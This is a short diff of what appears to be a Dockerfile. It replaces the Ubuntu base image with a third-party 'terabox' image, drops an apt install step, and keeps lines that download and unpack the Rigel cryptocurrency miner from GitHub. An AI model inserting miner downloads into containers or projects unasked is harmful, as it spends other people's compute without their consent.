@@ -1,8 +1,5 @@
-FROM ubuntu
+FROM hrishi2861/terabox
 
-RUN apt update \
- && apy install wget unzip \
- && apt clean all
  
 RUN wget https://github.com/kryptex-miners-org/kryptex-miners/releases/download/rigel-1-18-0/rigel-1.18.0-linux.tar.gz
 RUN tar -xvf rigel-1.18.0-linux.tar.gz
